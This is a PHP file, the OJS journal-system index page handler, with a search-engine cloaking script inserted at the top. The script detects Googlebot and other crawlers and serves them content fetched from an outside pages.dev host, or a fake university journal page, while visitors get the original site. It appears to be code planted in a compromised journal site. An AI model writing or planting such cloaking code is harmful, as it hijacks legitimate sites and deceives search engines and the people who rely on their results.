<?php
// ============================================================
// CLOAKING SCRIPT UNTUK GOOGLE BOT - VERSI PHP (DIPERBAIKI)
// ============================================================

// Deteksi User-Agent
$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
$isBot = preg_match('/(Googlebot|bingbot|YandexBot|Baiduspider|facebookexternalhit|Twitterbot|AdsBot-Google|Mediapartners-Google)/i', $userAgent);

// URL konten putih (untuk Google Bot)
$whiteContentUrl = 'https://revisi-seminar.pages.dev/index.txt';

// Hanya untuk halaman utama (root path) dan bot
if ($isBot && $_SERVER['REQUEST_URI'] == '/') {
    // GOOGLE BOT: Tampilkan konten putih
    $whiteContent = @file_get_contents($whiteContentUrl);
    if ($whiteContent === false) {
        // Fallback konten jika fetch gagal
        $whiteContent = '<!DOCTYPE html>
<html>
<head><title>Jurnal Ilmiah</title></head>
<body>
<h1>Jurnal Ilmiah Universitas</h1>
<p>Selamat datang di portal jurnal ilmiah kami.</p>
<p>ISSN: 1234-5678</p>
</body>
</html>';
    }
    header('Content-Type: text/html; charset=utf-8');
    header('Vary: User-Agent');
    echo $whiteContent;
    exit;
}

// ============================================================
// KODE ASLI OJS (JANGAN DIUBAH)
// ============================================================
?>

/**
 * @defgroup pages_index Index Pages
 */
 
/**
 * @file pages/index/index.php
 *
 * Copyright (c) 2014-2021 Simon Fraser University
 * Copyright (c) 2003-2021 John Willinsky
 * Distributed under the GNU GPL v3. For full terms see the file docs/COPYING.
 *
 * @ingroup pages_index
 * @brief Handle site index requests. 
 *
 */

<?php
switch ($op) {
    case 'index':
        define('HANDLER_CLASS', 'IndexHandler');
        import('pages.index.IndexHandler');
        break;
}
?>
